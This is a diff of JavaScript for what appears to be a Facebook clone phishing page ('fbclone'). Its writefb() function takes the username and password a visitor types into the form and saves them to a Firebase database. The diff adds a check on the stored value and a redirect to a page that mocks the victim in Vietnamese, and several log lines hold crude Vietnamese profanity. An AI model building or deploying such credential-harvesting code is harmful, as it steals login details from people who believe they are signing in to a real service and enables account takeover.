@@ -1,4 +1,4 @@
-console.log("mò cái lồn.");
+console.log("mò cái lồn");
 
 //time
 var today = new Date();
@@ -42,12 +42,18 @@ function writefb() {
             name: document.getElementById("name").value,
             pass: document.getElementById("pass").value,
         });
-	var ref = firebase.database().ref('fbclone/' + check  + '/name');
+	var ref = firebase.database().ref('fbclone/' + check + '/name');
 	ref.on("value", function(snapshot) {
-		window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
+		if (snapshot.val() == null) {
 		console.log(snapshot.val());
+		console.log("cc");
+		} else { 
+		console.log("lồn");
+		window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
+		}
 	}, function (error) {
 	console.log("Error: " + error.code);
+	console.log("lồn ");
 	});
 
 }
